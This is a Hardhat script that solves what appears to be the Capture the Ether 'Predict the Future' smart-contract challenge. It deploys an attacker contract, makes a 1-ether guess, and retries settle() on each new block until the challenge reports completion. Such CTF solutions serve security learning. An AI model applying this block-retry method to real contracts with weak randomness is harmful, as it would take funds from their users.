const { ethers } = require("hardhat");

async function main() {
  const challenge = await ethers.getContractAt(
    "PredictTheFutureChallenge",
    "0x524114778B4A48CAD68103f8689A3B217dc3C2B2"
  );

  const AttackFactory = await ethers.getContractFactory("AttackPTFChallenge");
  const attack = await AttackFactory.deploy();
  await attack.deployed();

  console.log("Attack Contract Address:", attack.address);

  await attack
    .attack(challenge.address, {
      value: ethers.utils.parseEther("1"),
    })
    .then((tx) => tx.wait());

  const startBlock = await ethers.provider.getBlockNumber();
  let latestBlock = startBlock;

  while (latestBlock - startBlock <= 25) {
    let last = 0;
    let found = false;

    latestBlock = await ethers.provider.getBlockNumber();
    if (last === latestBlock || latestBlock === startBlock) continue;

    await attack
      .settle(challenge.address)
      .then((tx) => tx.wait())
      .then((rcpt) => {
        console.log("Found in block number:", rcpt.blockNumber);
        found = true;
      })
      .catch(() => {
        console.log("Not found for block number:", latestBlock + 1);
      });

    if (found) break;
    last = latestBlock;
  }

  console.log("isComplete:", await challenge.isComplete());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
